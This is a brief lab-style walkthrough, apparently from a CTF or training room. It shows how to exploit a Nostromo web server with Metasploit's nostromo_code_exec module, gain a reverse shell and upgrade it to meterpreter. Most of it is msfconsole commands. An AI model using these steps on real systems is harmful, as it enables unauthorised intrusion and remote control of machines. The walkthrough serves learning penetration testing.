# Exploiting a machine using Metasploit Framework # 

## Module: `exploit/multi/http/nostromo_code_exec` ##

* This machine is currently vulnerable to the metasploit module `exploit/multi/http/nostromo_code_execon` port 80, and this task will take you through the process of exploiting it and gaining a shell on the machine.

---
### Running `msfconsole` ###

```BASH
> search nostromo
> use 0
> options
> set rhosts 10.10.122.38
> set rport 80
> set lport <my-machines-ip> # which is the ip address you get when you run $ifconfig | grep inet
> exploit
```

* If you get a regular shell you can almost always upgrade it to a meterpreter by running;
* Before that you need to send the regular shell to background by typing `background` or `bg`

```BASH
> search shell_to
> use 0
> options 
> set session <session of the regular shell>
> sessions      #to list sessions
> session -i <meterpreter session id> 
```
